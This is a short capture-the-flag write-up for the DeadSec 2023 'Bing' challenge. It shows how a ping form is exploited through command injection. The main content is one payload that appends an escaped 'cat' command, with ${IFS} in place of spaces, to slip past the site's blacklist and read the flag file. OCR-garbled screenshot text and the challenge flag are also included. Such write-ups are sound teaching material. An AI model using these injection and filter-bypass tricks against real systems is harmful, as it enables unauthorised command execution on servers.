# Bing
> `-`

## About the Challenge
We were given a website that contains a form and we can input a host there


[Image extracted text: ping
DEADSEC 2023
6 7 6
https://ecc905bc18ec53e3efdd8022.deadsecquest flag
Home
Flag for you
Don't hack my website
Host
8.8.8.8
Submit]


And then I tried to input 127.0.0.1 and here was the output


[Image extracted text: ping result
DEADSEC 2023
7 G
https://ecc905bc18ec53e3efdd8022.deadsecquest flag
Home
Flag for you
Flag for you
error when executing
command
127.0.0.1
Back]


## How to Solve?
We need to exploit the website using `Command Injection` vulnerability in order to read the flag. Here is the payload I used to read the flag

```
127.0.0.1;c\a\t${IFS}/f\lag.txt${IFS}|base64
```

Because some of the commands are blacklisted by the website (Like `cat` or `ls`), we can trick it with `/` character.  And because whitespace is also blacklisted by the website we can use `${IFS}`


[Image extracted text: Inspector
1 -
X
Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
Selection
48 (0x30)
POST / flag HTTP/=
<li>
Host
ccsoSbcl8ec53e3e fdd80::
deadsec-quest
href-" / flag"
Selected text
User-Agent
Hozilla/ 5
(Vindous
IT
10
Vin64;
{64;
17:109
Geclo/:O100101
Flag
for
You
Firefor/ll-
</a7
ZGWhZHtva_SrbzshISF fdGgxclSn
Aecept
<[li>
bEFnX-YUl-
ZHFV9Cg==
ext /html
applicat
on / xhthltxul , applicat
on/ xhl
F0
image / avif
1nage /vebp
1*{T=0.8
<ful>
Accept -
aguage
en-US
en;
1cC
Encoding:
gzip ,
deflace
divz
Content-
Type
applicat
on / *--form-ur lencoded
nav-
collapse
Decoded from:
Base64
Content-Lengch:
divz
Origin:
https:
/806242[5[4193205339c6125
deadsec- quest
{navs
dead(okolol:
thls_fllg_fOR
Referer
https:
806242f5f4193e05339c6125
deadsec- quest / flag
TOU}
ade
Ins
cure-Requests
Adiv
class=
Container
Sec--
etch--
Dest :
docuent
Sec--
etch-Hode
navigate
<hl>
Sec--
etch-
Site:
ae
origin
You
Sec-Fetch-User:
</hl>
Request attributes
crallers
<br/ >
host-137
0-1;Clalt; (IFS} /€1
trt; (IFS} Ibasee4
Request query parameters
<pref
FcvhZHtva-Srb_shISF fdGgxc
SmbEFnX-TuUl
ZHFV9Cg=
Request body parameters
~Ipre>
Request cookies
type
button
class
"btn
btn-lin-
href=
avascript history-back (-1/ ;
Back:
Request headers
<fdivz
Response headers
7 _ _
[container
~_8
Bootstrap
core
JavaScript
<script
Src=
[stacic/js/Jquery-min-Js" >
script>
<script
SICE
[stacic/Js/bootstrap
min- Js
script
~/body>
(hcnl>
Seorch;
matches
Seorcn;
matches
Done
1,278 bytes
265 millis
4-0
ept
Upgr =
Flag
for
lag]


```
dead{okokok!!!_th1s_flAg_f0R_Y0U}
```